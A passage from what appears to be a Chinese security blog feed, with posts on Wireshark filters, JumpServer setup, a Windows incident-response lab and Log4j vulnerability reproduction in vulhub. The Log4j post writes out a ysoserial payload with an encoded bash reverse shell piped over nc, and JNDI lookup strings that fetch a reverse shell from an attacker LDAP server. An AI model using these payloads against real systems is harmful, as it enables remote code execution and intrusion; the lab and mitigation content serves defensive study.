192.168.31.52</span><br><span class="line">3、源、目标IP</span><br><span class="line">ip.src == 192.168.31.52</span><br><span class="line">ip.dst == 192.168.31.52</span><br><span class="line">4、使用and</span><br><span class="line">ip.src == 192.168.31.1 and ip.dst == 192.168.31.52</span><br><span class="line">5、筛选http请求：</span><br><span class="line">http.request.method == &quot;POST&quot;</span><br><span class="line">http.request.uri.path == &quot;/admin.php&quot;</span><br></pre></td></tr></table></figure><p><img src="/img/Blue-Team-Packet-Sniffing-WireShark/image-20240229211946705.png" alt="image-20240229211946705"></p><p>筛选udp 出现 dns、nbns协议，因为这些应用层协议是基于传输层udp 协议的</p><p><img src="/img/Blue-Team-Packet-Sniffing-WireShark/image-20240229212511973.png" alt="image-20240229212511973"></p><p>筛选http协议出现tcp、ocsp 协议，是因为 HTTP 通信依赖于 TCP 协议，而 OCSP 是 HTTPS 通信中用于证书验证的一个组成部分，它们都是网络通信中常见的协议。</p><h3 id="5、常见协议分析ARP"><a href="#5、常见协议分析ARP" class="headerlink" title="5、常见协议分析ARP"></a>5、常见协议分析ARP</h3><p>ARP协议：地址解析协议，通过解析网络层地址来找寻数据链路层地址的网络传输协议，即定位MAC地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">如ping 一个ip</span><br><span class="line">会先查看该IP 是否在本地有arp缓存，有的话直接发送icmp数据包</span><br><span class="line">没有的话会先返送arp数据包，再发送icmp数据包</span><br></pre></td></tr></table></figure><p>协议分析的时候我们需要关闭混淆模式，避免一些干扰的数据包存在，只抓取流入本地计算机和广播数据包</p><p><img src="/img/Blue-Team-Packet-Sniffing-WireShark/image-20240301103107969.png" alt="image-20240301103107969"></p><p>分析ARP 数据包</p><p><img src="/img/Blue-Team-Packet-Sniffing-WireShark/image-20240301104310639.png" alt="image-20240301104310639"></p><p><img src="/img/Blue-Team-Packet-Sniffing-WireShark/image-20240301104908518.png" alt="image-20240301104908518"></p><h3 id="6、常见协议分析ICMP"><a href="#6、常见协议分析ICMP" class="headerlink" title="6、常见协议分析ICMP"></a>6、常见协议分析ICMP</h3><p>我们用普通模式抓取icmp 数据包，只抓取一个icmp 数据包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping baidu.com -n 1</span><br></pre></td></tr></table></figure><p>分析ICMP 数据包</p><p><img src="/img/Blue-Team-Packet-Sniffing-WireShark/image-20240301105939608.png" alt="image-20240301105939608"></p><p>相应包和请求包是一样的格式</p><h3 id="7、常见协议分析TCP"><a href="#7、常见协议分析TCP" class="headerlink" title="7、常见协议分析TCP"></a>7、常见协议分析TCP</h3><p>我们可以在本地浏览器去访问一个http网页</p><p>分析TCP 三次握手数据包</p><p><img src="/img/Blue-Team-Packet-Sniffing-WireShark/image-20240301112108005.png" alt="image-20240301112108005"></p><p><img src="/img/Blue-Team-Packet-Sniffing-WireShark/image-20240301112507884.png" alt="image-20240301112507884"></p><p><img src="/img/Blue-Team-Packet-Sniffing-WireShark/image-20240301112643427.png" alt="image-20240301112643427"></p><p>可以在【统计】中【流量图】去更加直观的查看流量，流量类型选择【TCP】</p><p><img src="/img/Blue-Team-Packet-Sniffing-WireShark/image-20240301113122950.png" alt="image-20240301113122950"></p><p>四次挥手数据包不再分析</p><p><img src="/img/Blue-Team-Packet-Sniffing-WireShark/image-20240301124649718.png" alt="image-20240301124649718"></p><h3 id="8、常见协议分析HTTP"><a href="#8、常见协议分析HTTP" class="headerlink" title="8、常见协议分析HTTP"></a>8、常见协议分析HTTP</h3><p>HTTP是TCP 的上层协议，所以我们过滤TCP的数据包会包含http 协议的数据包</p><p>分析http 的页面请求</p><p><img src="/img/Blue-Team-Packet-Sniffing-WireShark/image-20240301125329153.png" alt="image-20240301125329153"></p><p>可以追踪TCP 或 HTTP流，查看详细的数据包请求</p><p><img src="/img/Blue-Team-Packet-Sniffing-WireShark/image-20240301130029416.png" alt="image-20240301130029416"></p><h2 id="三、WireShark-快速定位数据包—类型"><a href="#三、WireShark-快速定位数据包—类型" class="headerlink" title="三、WireShark 快速定位数据包—类型"></a>三、WireShark 快速定位数据包—类型</h2><h3 id="1、定位请求类型"><a href="#1、定位请求类型" class="headerlink" title="1、定位请求类型"></a>1、定位请求类型</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http.request.method == &quot;GET&quot;</span><br><span class="line">http.request.method == &quot;POST&quot;</span><br></pre></td></tr></table></figure><h3 id="2、定位响应状态码"><a href="#2、定位响应状态码" class="headerlink" title="2、定位响应状态码"></a>2、定位响应状态码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.response.code == 200</span><br></pre></td></tr></table></figure><h3 id="3、定位请求头字段"><a href="#3、定位请求头字段" class="headerlink" title="3、定位请求头字段"></a>3、定位请求头字段</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.host == &quot;www.example.com&quot;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 蓝队应急 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WireShark </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【堡垒机】JumpServer 堡垒机搭建和使用</title>
      <link href="/2024/02/29/Blue-Team-Bastion-Host-JumpServer/"/>
      <url>/2024/02/29/Blue-Team-Bastion-Host-JumpServer/</url>
      
        <content type="html"><![CDATA[<h1 id="JumpServer-堡垒机搭建和使用"><a href="#JumpServer-堡垒机搭建和使用" class="headerlink" title="JumpServer 堡垒机搭建和使用"></a>JumpServer 堡垒机搭建和使用</h1><h1 id="一、堡垒机介绍"><a href="#一、堡垒机介绍" class="headerlink" title="一、堡垒机介绍"></a>一、堡垒机介绍</h1><p>堡垒机（Bastion Host）是一种网络安全设备，它在一个特定的网络环境下，为了保障网络和数据不受外部和内部用户的入侵和破坏，运用各种技术手段监控和记录运维人员对网络内的服务器、网络设备、安全设备、数据库等设备的操作行为。堡垒机的核心功能通常包括4A：身份验证（Authentication）、账号管理（Account）、授权控制（Authorization）和安全审计（Audit）。它帮助企业实现对IT资源的集中管理和安全控制，确保只有授权用户才能访问特定的系统资源，并且所有操作都会被记录和审计，以便于事后分析和责任追踪。</p><h1 id="二、JumpServer-堡垒机"><a href="#二、JumpServer-堡垒机" class="headerlink" title="二、JumpServer 堡垒机"></a>二、JumpServer 堡垒机</h1><p>官网：<a href="https://www.jumpserver.org/">JumpServer - 开源堡垒机 - 官网</a><br>Github：<a href="https://github.com/jumpserver/jumpserver">JumpServer 是广受欢迎的开源堡垒机</a></p><p>JumpServer 是全球首款完全开源的堡垒机，使用 GNU GPL v2.0 开源协议，是符合 4A 规范的运维安全审计系统，提供身份验证、授权控制、账号管理、安全审计等功能支持。采用分布式架构设计，支持容器化部署，能够支持多种资产类型和大规模资产纳管，适用于金融、制造、物流、媒体、互联网等行业的企业用户。</p><h1 id="三、JumpServer-部署"><a href="#三、JumpServer-部署" class="headerlink" title="三、JumpServer 部署"></a>三、JumpServer 部署</h1><h3 id="1、在线部署"><a href="#1、在线部署" class="headerlink" title="1、在线部署"></a>1、在线部署</h3><ol><li>准备一台 2核4G （最低）且可以访问互联网的 64 位 Linux 主机；</li><li>以 root 用户执行如下命令一键安装 JumpServer。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -sSL https://resource.fit2cloud.com/jumpserver/jumpserver/releases/latest/download/quick_start.sh | bash</span><br></pre></td></tr></table></figure><p>安装完成后，根据提示进行配置，如设置域名等。</p><h3 id="2、离线部署"><a href="#2、离线部署" class="headerlink" title="2、离线部署"></a>2、离线部署</h3><ol><li><p>下载解压JumpServer 安装包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://community.fit2cloud.com/#/download/jumpserver/v3-10-3</span><br></pre></td></tr></table></figure></li><li><p>根据需要修改配置文件 <code>config.txt</code></p></li><li><p>执行安装脚本 <code>./jmsctl.sh install</code></p></li><li><p>启动 JumpServer 服务 <code>./jmsctl.sh start</code></p></li></ol><h3 id="3、Docker-部署"><a href="#3、Docker-部署" class="headerlink" title="3、Docker 部署"></a>3、Docker 部署</h3><p>1、生成密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">密码1：</span><br><span class="line">if [ &quot;$SECRET_KEY&quot; = &quot;&quot; ]; then SECRET_KEY=`cat /dev/urandom | tr -dc A-Za-z0-9 | head -c 50`; echo &quot;SECRET_KEY=$SECRET_KEY&quot; &gt;&gt; ~/.bashrc; echo $SECRET_KEY; else echo $SECRET_KEY; fi</span><br><span class="line"></span><br><span class="line">密码2：</span><br><span class="line">if [ &quot;$BOOTSTRAP_TOKEN&quot; = &quot;&quot; ]; then BOOTSTRAP_TOKEN=`cat /dev/urandom | tr -dc A-Za-z0-9 | head -c 16`; echo &quot;BOOTSTRAP_TOKEN=$BOOTSTRAP_TOKEN&quot; &gt;&gt; /.baserc; echo $BOOTSTRAP_TOKEN; else echo $BOOTSTRAP_TOKEN; fi</span><br></pre></td></tr></table></figure><p><img src="/img/Blue-Team-Bastion-Host-JumpServer/image-20240229133312797.png" alt="image-20240229133312797"></p><p>2、部署jumpserver</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -itd --name jumpserver --restart=always -p 88:80 -p 2222:2222 -e SECRET_KEY=v91b2DNK07Hl95nmISbnlxFy6zck9hXH0PtMVSiHgq2RJwevaG -e BOOTSTRAP_TOKEN=aHmacjFzWRbhAtBk -v /opt/jumpserver/data/:/opt/jumpserver/data/ -v /opt/jumpserver/mysql/:/var/lib/mysql jumpserver/jms_all:v2.8.4</span><br></pre></td></tr></table></figure><p>3、访问jumpserver web页面</p><p><a href="http://192.168.8.2/">http://192.168.8.2</a> 或 <a href="http://192.168.8.2/ui">http://192.168.8.2/ui</a></p><p>默认账号密码：admin&#x2F;admin（初次访问会要求更改密码）</p><h1 id="四、相关使用"><a href="#四、相关使用" class="headerlink" title="四、相关使用"></a>四、相关使用</h1><h3 id="1、创建JumpServer-用户或用户组"><a href="#1、创建JumpServer-用户或用户组" class="headerlink" title="1、创建JumpServer 用户或用户组"></a>1、创建JumpServer 用户或用户组</h3><p><img src="/img/Blue-Team-Bastion-Host-JumpServer/image-20240229163252908.png" alt="image-20240229163252908"></p><h3 id="2、创建资产"><a href="#2、创建资产" class="headerlink" title="2、创建资产"></a>2、创建资产</h3><p><img src="/img/Blue-Team-Bastion-Host-JumpServer/image-20240229163330169.png" alt="image-20240229163330169"></p><h3 id="3、通过Web终端连接服务器"><a href="#3、通过Web终端连接服务器" class="headerlink" title="3、通过Web终端连接服务器"></a>3、通过Web终端连接服务器</h3><p><img src="/img/Blue-Team-Bastion-Host-JumpServer/image-20240229163813689.png" alt="image-20240229163813689"></p><p><img src="/img/Blue-Team-Bastion-Host-JumpServer/image-20240229163821273.png" alt="image-20240229163821273"></p><h3 id="4、日志审计"><a href="#4、日志审计" class="headerlink" title="4、日志审计"></a>4、日志审计</h3><p><img src="/img/Blue-Team-Bastion-Host-JumpServer/image-20240229164019358.png" alt="image-20240229164019358"></p><h3 id="5、会话审计"><a href="#5、会话审计" class="headerlink" title="5、会话审计"></a>5、会话审计</h3><p><img src="/image-20240229164147688.png" alt="image-20240229164147688"></p>]]></content>
      
      
      <categories>
          
          <category> 蓝队应急 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JumpServer堡垒机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【应急靶场】Win Server Web1入侵排查</title>
      <link href="/2024/02/28/Emergency-WinServer-web1/"/>
      <url>/2024/02/28/Emergency-WinServer-web1/</url>
      
        <content type="html"><![CDATA[<h1 id="Windows-Server-Web1入侵排查"><a href="#Windows-Server-Web1入侵排查" class="headerlink" title="Windows Server Web1入侵排查"></a>Windows Server Web1入侵排查</h1><h1 id="一、环境搭建"><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h1><p>小李在值守的过程中，发现有CPU占用飙升，出于胆子小，就立刻将服务器关机，并找来正在吃苕皮的hxd帮他分析，这是他的服务器系统，请你找出以下内容，并作为通关条件：</p><ol><li>攻击者的shell密码</li><li>攻击者的IP地址</li><li>攻击者的隐藏账户名称</li><li>攻击者挖矿程序的矿池域名(仅域名)</li><li>有实力的可以尝试着修复漏洞</li></ol><p>网盘下载压缩包，解压后，在高版本（大于17.5）的VM中扫描打开</p><img src="/img/Emergency-WinServer-web1/image-20240228125056092.png" alt="image-20240228125056092" style="zoom:150%;" /><p>获取所有权并开启靶机</p><h1 id="二、排查后门账户"><a href="#二、排查后门账户" class="headerlink" title="二、排查后门账户"></a>二、排查后门账户</h1><p>先简单用命令查看一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure><img src="/img/Emergency-WinServer-web1/image-20240228131841287.png" alt="image-20240228131841287" style="zoom:150%;" /><p>没有可疑用户，查看账户管理，发现隐藏用户 <code>hack168$</code></p><p><img src="/img/Emergency-WinServer-web1/image-20240228132109595.png" alt="image-20240228132109595"></p><p><img src="/img/Emergency-WinServer-web1/image-20240228142236880.png" alt="image-20240228142236880"></p><p>注册表中未发现更多的克隆用户</p><p><img src="/img/Emergency-WinServer-web1/image-20240228132455940.png" alt="image-20240228132455940"></p><p>查看本地用户和组管理：</p><ul><li>查看用户<img src="/img/Emergency-WinServer-web1/image-20240228132741523.png" alt="image-20240228132741523"></li><li>查看管理员组<img src="/img/Emergency-WinServer-web1/image-20240228132721412.png" alt="image-20240228132721412"></li></ul><p>可以确定<code>hack168$</code>这个用户是一个隐藏的后门用户</p><h1 id="三、检查端口、进程"><a href="#三、检查端口、进程" class="headerlink" title="三、检查端口、进程"></a>三、检查端口、进程</h1><h3 id="1、端口检查"><a href="#1、端口检查" class="headerlink" title="1、端口检查"></a>1、端口检查</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano</span><br></pre></td></tr></table></figure><p><img src="/img/Emergency-WinServer-web1/image-20240228134359570.png" alt="image-20240228134359570"></p><p>可以看到与某IP的80端口已经建立了连接</p><p>可以通过如下将与此IP 的所有链接切除</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist | findstr &quot;7712&quot;</span><br></pre></td></tr></table></figure><h3 id="2、进程排查"><a href="#2、进程排查" class="headerlink" title="2、进程排查"></a>2、进程排查</h3><p>为了进一步上述端口连接是恶意连接，我们可以通过端口连接的进程号检测其进程</p><p><code>msinfo32</code>在“系统信息”-&gt;“软件环境”-&gt;“正在运行任务”中查看该进程信息</p><p><img src="/img/Emergency-WinServer-web1/image-20240228135223293.png" alt="image-20240228135223293"></p><p>属于“三无产品”，基本可以猜测属于恶意进程</p><p>我们通过火绒剑或者D盾等工具，检查7712是否存在守护进程</p><img src="/img/Emergency-WinServer-web1/image-20240228135807602.png" alt="image-20240228135807602" style="zoom:150%;" /><p>确实存在7444的守护进程</p><h1 id="四、自启动后门排查"><a href="#四、自启动后门排查" class="headerlink" title="四、自启动后门排查"></a>四、自启动后门排查</h1><h3 id="1、计划任务排查"><a href="#1、计划任务排查" class="headerlink" title="1、计划任务排查"></a>1、计划任务排查</h3><p>【控制面板】—【系统安全】—【计划任务】</p><p><img src="/img/Emergency-WinServer-web1/image-20240228140439434.png" alt="image-20240228140439434"></p><p>安全的计划任务，无后门</p><h3 id="2、服务排查"><a href="#2、服务排查" class="headerlink" title="2、服务排查"></a>2、服务排查</h3><p><img src="/img/Emergency-WinServer-web1/image-20240228141253474.png" alt="image-20240228141253474"></p><p>服务这里也没有异常</p><h3 id="3、自启动文件夹排查"><a href="#3、自启动文件夹排查" class="headerlink" title="3、自启动文件夹排查"></a>3、自启动文件夹排查</h3><p><img src="/img/Emergency-WinServer-web1/image-20240228141631120.png" alt="image-20240228141631120"></p><img src="/img/Emergency-WinServer-web1/image-20240228141837511.png" alt="image-20240228141837511" style="zoom:150%;" /><h3 id="4、自启动注册表项"><a href="#4、自启动注册表项" class="headerlink" title="4、自启动注册表项"></a>4、自启动注册表项</h3><p>有众多启动东注册表项，不一一展示了，均无后门存在</p><p><img src="/img/Emergency-WinServer-web1/image-20240228142026545.png" alt="image-20240228142026545"></p><h1 id="五、日志检测"><a href="#五、日志检测" class="headerlink" title="五、日志检测"></a>五、日志检测</h1><h3 id="1、windows安全日志"><a href="#1、windows安全日志" class="headerlink" title="1、windows安全日志"></a>1、windows安全日志</h3><p>针对用户的登陆，我们主要查看安全日志。可以从【事件查看器】中查看windows 的安全日志，此日志存储位置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%SystemRoot%\System32\Winevt\Logs\Security.evtx</span><br></pre></td></tr></table></figure><p><img src="/img/Emergency-WinServer-web1/image-20240228162517906.png" alt="image-20240228162517906"></p><h3 id="2、Web日志检测"><a href="#2、Web日志检测" class="headerlink" title="2、Web日志检测"></a>2、Web日志检测</h3><p>靶场是通过phpstudy 搭建网站，我们直接到apache的日志目录下查看成功日志</p><p><img src="/img/Emergency-WinServer-web1/image-20240228162858183.png" alt="image-20240228162858183"></p><p>日志数据不算多，我们通过在线网站简单分析下</p><p><img src="/img/Emergency-WinServer-web1/image-20240228164917088.png" alt="image-20240228164917088"></p><p>60条记录以上是本地服务器在访问，60以下发现<code>192.168.126.1</code> 这个IP 在对本地web进行了访问</p><p><img src="/img/Emergency-WinServer-web1/image-20240228165159815.png" alt="image-20240228165159815"></p><p>97条记录以上还算正常，但是从98条记录开始，<code>192.168.126.1</code>不停的对一个路径以1s几乎20次速度进行访问，疑似爆破行为</p><p><img src="/img/Emergency-WinServer-web1/image-20240228165358717.png" alt="image-20240228165358717"></p><p>在5分钟之内发起了近5700次访问，正常访问远远达不到这样的速度，结合爆破的路径，确认该IP存在账号密码爆破行为</p><p><img src="/img/Emergency-WinServer-web1/image-20240228170035590.png" alt="image-20240228170035590"></p><p>在后面的行为中恶意IP疑似进行了上传操作，结合上述爆破行为，确认恶意IP已经爆破成功并且进入了后台管理</p><p><img src="/img/Emergency-WinServer-web1/image-20240228165851418.png" alt="image-20240228165851418"></p><p>继续往后看，恶意IP通过插件上传功能上传了木马文件shell.php，上传点位于&#x2F;content&#x2F;plugins&#x2F;tips&#x2F;shell.php</p><p><img src="/img/Emergency-WinServer-web1/image-20240228171505311.png" alt="image-20240228171505311"></p><p>查看该木马文件，连接密码是冰蝎默认密码<code>rebeyond</code></p><p><img src="/img/Emergency-WinServer-web1/image-20240228172303857.png" alt="image-20240228172303857"></p><p>一直到最后都是对该木马文件的访问</p><p><img src="/img/Emergency-WinServer-web1/image-20240228190129858.png" alt="image-20240228190129858"></p><h1 id="六、病毒文件排查"><a href="#六、病毒文件排查" class="headerlink" title="六、病毒文件排查"></a>六、病毒文件排查</h1><p>我们对隐藏用户<code>hack168$</code>用户的家目录进行排查，在桌面找到一个可疑文件，运行之后CPU飙升，判别为挖矿病毒</p><img src="/img/Emergency-WinServer-web1/image-20240228190951402.png" alt="image-20240228190951402" style="zoom:150%;" /><p>该病毒图标为pyinstaller 打包后的exe默认图标，我们用pyinstxtractor 进行反编译</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python pyinstxtractor.py Kuang.exe</span><br></pre></td></tr></table></figure><p>得到pyc文件</p><p><img src="/img/Emergency-WinServer-web1/image-20240228194306068.png" alt="image-20240228194306068"></p><p>通过<a href="http://wakuang.zhigongshanfang.top/">pyc在线反编译工具</a>进行反编译，得到挖矿程序的矿池域名<code>http://wakuang.zhigongshanfang.top</code></p><p><img src="/img/Emergency-WinServer-web1/image-20240228194514926.png" alt="image-20240228194514926"></p><h1 id="七、使用工具一把梭"><a href="#七、使用工具一把梭" class="headerlink" title="七、使用工具一把梭"></a>七、使用工具一把梭</h1><p>1、木马文件</p><p><img src="/img/Emergency-WinServer-web1/image-20240228201127518.png" alt="image-20240228201127518"></p><p>2、克隆用户</p><p><img src="/img/Emergency-WinServer-web1/image-20240228201204685.png" alt="image-20240228201204685"></p><p>3、系统补丁漏洞</p><p><img src="/img/Emergency-WinServer-web1/image-20240228202006568.png" alt="image-20240228202006568"></p><p>4、日志检测</p><p><img src="/img/Emergency-WinServer-web1/image-20240228202249752.png" alt="image-20240228202249752"></p>]]></content>
      
      
      <categories>
          
          <category> 应急靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 入侵排查 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【漏洞复现】Apache Log4j系列漏洞复现</title>
      <link href="/2024/02/27/VulnRep-Log4j/"/>
      <url>/2024/02/27/VulnRep-Log4j/</url>
      
        <content type="html"><![CDATA[<h1 id="【漏洞复现】Apache-Log4j系列漏洞复现"><a href="#【漏洞复现】Apache-Log4j系列漏洞复现" class="headerlink" title="【漏洞复现】Apache Log4j系列漏洞复现"></a>【漏洞复现】Apache Log4j系列漏洞复现</h1><h2 id="一、Log4j反序列化命令执行漏洞（CVE-2017-5645）"><a href="#一、Log4j反序列化命令执行漏洞（CVE-2017-5645）" class="headerlink" title="一、Log4j反序列化命令执行漏洞（CVE-2017-5645）"></a>一、Log4j反序列化命令执行漏洞（CVE-2017-5645）</h2><h3 id="1、漏洞原因"><a href="#1、漏洞原因" class="headerlink" title="1、漏洞原因"></a>1、漏洞原因</h3><p><strong>影响版本：</strong>Apache Log4j 2.x 版本（2.8.2之前的2.x版本）</p><p>Log4j 是一个广泛应用的Java 日志库，用来记录程序日志，并且支持远程服务器。是一个由Apache软件基金会维护的开源日志框架，它为Java应用程序提供了灵活的日志记录功能。该框架允许开发者通过配置文件来控制日志的输出目的地、输出格式、日志级别等，而无需修改应用程序代码。这使得日志管理变得更加灵活和高效。一些著名的开源项目，如sprint、hibernate、struts 都是使用该日志框架。</p><p>攻击者可以通过发送一个特别制作的2进制payload，在该组件将字节反序列化为对象时，触发并执行构造的payload代码。该漏洞主要是由于在处理ObjectInputStream时，接收函数对于不可靠来源的input没有过滤。可以通过给TcpSocketServer和UdpSocketServer添加可配置的过滤功能以及一些相关设置，可以有效的解决该漏洞。</p><h3 id="2、环境搭建"><a href="#2、环境搭建" class="headerlink" title="2、环境搭建"></a>2、环境搭建</h3><p>vulhub 的CVE-2017-5645 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><h3 id="3、漏洞复现"><a href="#3、漏洞复现" class="headerlink" title="3、漏洞复现"></a>3、漏洞复现</h3><p>使用ysoserial工具：网盘已提供</p><p>ysoserial 是一个Java反序列化的利用工具，包含了多种利用链，可以生成利用不安全的 Java 对象反序列化的恶意负载（payload）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections5 &quot;需要执行的脚本base64编码和解码命令&quot; | nc 靶机IP 靶机端口</span><br><span class="line"></span><br><span class="line">如：</span><br><span class="line">java -jar ysoserial-master-30099844c6-1.jar CommonsCollections5 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMxLjUwLzQ0NDQgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; | nc 192.168.31.52 4712</span><br></pre></td></tr></table></figure><p><img src="/img/VulnRep-Log4j/image-20240227162307265.png" alt="image-20240227162307265"></p><p>成功接收到反弹shell。这里经过尝试，需要在公网上执行进行中转</p><h2 id="二、Log4j2远程代码执行漏洞（CVE-2021-44228）"><a href="#二、Log4j2远程代码执行漏洞（CVE-2021-44228）" class="headerlink" title="二、Log4j2远程代码执行漏洞（CVE-2021-44228）"></a>二、Log4j2远程代码执行漏洞（CVE-2021-44228）</h2><h3 id="1、漏洞原因-1"><a href="#1、漏洞原因-1" class="headerlink" title="1、漏洞原因"></a>1、漏洞原因</h3><p><strong>影响版本：</strong>Apache Log4j 2 的 2.0 到 2.14.1</p><p>log4j 是 Apache 的一个开源日志库，是一个基于 Java 的日志记录框架，而Log4j2 是 log4j 的后继者，其中引入了大量丰富的特性，可以控制日志信息输送的目的地为控制台、文件、GUI 组建等，被应用于业务系统开发，用于记录程序输入输出日志信息。log4j2 中存在JNDI注入漏洞，当程序记录用户输入的数据时，即可触发该漏洞，成功利用该漏洞可在目标服务器上造成远程代码执行（RCE）漏洞，执行任意代码。</p><p>漏洞的基本原理是Log4j2在处理日志消息时，会调用MessagePatternConverter消息组件中的format 方法，该方法会截取消息中的美元符号$连接花括号{}之间的字符串。如果这些字符串被设置为 <code>jndi:ldap</code> 的协议格式（例如${jndi:ldap:&#x2F;&#x2F;x.x.x.x:8000&#x2F;xxx.class}），Log4j2解析到 jndi 则会去指定的x.x.x.x:8000 的 ldap 服务找对应的xxx.class，如果没有，则会尝试从远程机器的 http 服务上找，如果找到了则返回到 JNDI 接口和Log4j2 组件，那么Log4j2 组件会将其下载下来，发现是class 文件，就会去执行里面的代码。攻击者可以利用这一点，通过在日志消息中注入恶意的JNDI请求，导致Log4j2从攻击者控制的服务器下载并执行恶意代码。</p><h3 id="2、环境搭建-1"><a href="#2、环境搭建-1" class="headerlink" title="2、环境搭建"></a>2、环境搭建</h3><p>vulhub — CVE-2021-44228</p><h3 id="3、漏洞复现-1"><a href="#3、漏洞复现-1" class="headerlink" title="3、漏洞复现"></a>3、漏洞复现</h3><p>访问靶机IP：8983</p><p><img src="/img/VulnRep-Log4j/image-20240227170038072.png" alt="image-20240227170038072"></p><p><strong>1、构造POC</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://$&#123;sys:java.version&#125;.xxx.dnslog.cn&#125;</span><br><span class="line">访问：</span><br><span class="line">http://127.0.0.1:8983/solr/admin/cores?action=$&#123;jndi:ldap://$&#123;sys:java.version&#125;.xxx.dnslog.cn&#125;</span><br></pre></td></tr></table></figure><p>在dnslog平台看到回显，或者用BP 的Collaborator 也可以</p><p><strong>2、反弹shell</strong></p><p>我们用到JNDIExploit.v1.2 工具：网盘已提供</p><p>先在vps攻击机上进行监听</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 6666</span><br></pre></td></tr></table></figure><p>然后用工具执行（需要1389、8080端口未占用）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDIExploit-1.2-SNAPSHOT.jar -i vps_ip</span><br></pre></td></tr></table></figure><p>执行POC</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8983/solr/admin/cores?action=$&#123;jndi:ldap://10.211.55.3:1389/Basic/ReverseShell/10.211.55.23/6666&#125;</span><br></pre></td></tr></table></figure><p>成功获取shell</p><p><img src="/img/VulnRep-Log4j/image-20240227175514673.png" alt="image-20240227175514673"></p><p>未完待续：<a href="https://blog.csdn.net/Myon5/article/details/136548391">https://blog.csdn.net/Myon5/article/details/136548391</a></p><h2 id="三、防御措施"><a href="#三、防御措施" class="headerlink" title="三、防御措施"></a>三、防御措施</h2><ol><li>更新Log4j版本：升级Log4j2到最新的安全版本（2.16或更高版本），这些版本已经修复了这个漏洞。<br>如果无法立即升级，可以添加系统属性log4j2.formatMsgNoLookups&#x3D;true来禁用消息查找功能。</li><li>限制外部服务器访问：限制或禁止对外部JNDI服务器的访问，特别是LDAP和RMI服务。</li><li>限制日志访问：限制对日志文件的访问权限，以防止未经授权的用户访问和操纵日志消息。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 复现与审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Log4j系列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【漏洞复现】Shiro 反序列化漏洞复现</title>
      <link href="/2024/02/27/VulnRep-Shiro/"/>
      <url>/2024/02/27/VulnRep-Shiro/</url>
      
